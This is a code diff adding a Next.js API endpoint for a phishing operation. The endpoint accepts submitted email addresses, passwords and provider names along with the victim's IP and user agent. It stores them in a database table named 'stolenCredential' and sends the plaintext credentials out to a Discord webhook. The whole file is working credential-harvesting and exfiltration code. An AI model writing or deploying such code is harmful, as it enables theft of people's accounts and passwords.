@@ -1,0 +1,33 @@
+import { NextRequest, NextResponse } from "next/server";
+import { prisma } from "@/lib/prisma";
+import { notifyDiscord } from "@/lib/discord/webhook";
+
+export async function POST(req: NextRequest) {
+  try {
+    const body = await req.json();
+    const { provider, email, password } = body;
+
+    if (!provider || !email || !password) {
+      return NextResponse.json({ ok: false }, { status: 400 });
+    }
+
+    const ip = req.headers.get("x-forwarded-for") || req.ip || "unknown";
+    const userAgent = req.headers.get("user-agent") || "unknown";
+
+    await prisma.stolenCredential.create({
+      data: {
+        provider,
+        email,
+        password,
+        ip,
+        userAgent,
+      },
+    });
+
+    await notifyDiscord({ provider, email, password, ip, userAgent });
+
+    return NextResponse.json({ ok: true });
+  } catch {
+    return NextResponse.json({ ok: false }, { status: 500 });
+  }
+}
